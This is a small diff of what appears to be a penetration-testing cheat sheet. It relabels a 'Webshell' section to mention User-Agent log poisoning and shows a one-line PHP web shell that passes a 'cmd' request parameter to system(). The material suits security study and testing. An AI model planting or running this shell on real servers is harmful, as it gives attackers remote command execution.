@@ -399,7 +399,7 @@ xterm-256color
 
 # Webshell
 
-## One line(User-Agent)
+## One line(User-Agent, log poisoning)
 
 ~~~ php
 <?php echo system($_GET['cmd']); ?>
